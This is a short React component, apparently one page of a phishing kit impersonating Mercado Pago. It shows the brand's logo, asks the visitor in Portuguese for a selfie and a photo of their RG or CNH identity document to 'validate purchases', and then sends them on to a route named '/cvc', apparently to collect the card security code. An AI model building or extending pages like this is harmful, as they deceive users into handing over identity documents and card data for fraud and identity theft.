import React from 'react';
import { Link } from 'react-router-dom';

import Logo from '../../assets/mercado-pago.svg';

import { Container, Topo, Inputs } from './styles';

function Primeira() {
  return (
    <Container>
      <Topo>
        <img src={Logo} alt=""/>
      </Topo>

      <h1>Tire uma foto sua e do seu RG ou CNH. Isso vai nos ajudar e validar suas próximas compras.</h1>

      <Inputs>
        <p>Foto sua</p>
        <input type="file" accept="image/*" capture="camera" />

        <p>Foto do seu documento</p>
        <input type="file" accept="image/*" capture="camera" />

        <Link to="/cvc"><button>Enviar</button></Link>
      </Inputs>
    </Container>
  );
}

export default Primeira;